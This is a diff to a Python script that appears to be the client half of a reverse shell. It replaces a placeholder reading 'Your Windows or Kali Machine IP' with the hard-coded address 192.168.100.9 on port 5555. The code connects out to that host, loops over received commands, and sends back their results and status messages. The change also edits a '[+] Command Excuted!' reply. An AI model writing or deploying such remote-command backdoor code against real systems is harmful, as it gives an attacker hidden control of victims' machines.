@@ -4,7 +4,7 @@ import os
 
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-socket.connect(('Your Windows or Kali Machine IP', 5555))
+socket.connect(('192.168.100.9', 5555))
 
 while True:
 
@@ -100,6 +100,7 @@ while True:
             socket.send('ERROR'.encode('ascii'))
 
             continue
+
     else:
 
         try:
@@ -108,7 +109,9 @@ while True:
 
             if out == '':
                 
-                socket.send('Command Excuted!'.encode('ascii'))
+                socket.send('[+] Command Excuted!'.encode('ascii'))
+
+                continue
             
             else:
 
